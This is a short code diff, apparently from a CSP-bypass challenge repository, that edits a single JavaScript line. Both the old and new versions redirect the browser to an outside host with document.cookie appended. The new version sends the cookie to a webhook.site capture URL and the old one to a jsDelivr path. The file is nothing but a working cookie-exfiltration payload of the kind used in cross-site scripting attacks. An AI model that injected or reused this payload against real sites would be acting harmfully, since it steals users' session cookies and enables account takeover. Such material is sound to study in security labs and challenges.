@@ -1,1 +1,3 @@
-document.location = "https://cdn.jsdelivr.net/gh/krishnan-tech/csp-chal-bypass@version/file/?cookie=" + document.cookie;
+document.location =
+  "https://webhook.site/3df9ef8e-7abe-497c-92ae-85ba9ad8d783/?cookie=" +
+  document.cookie;
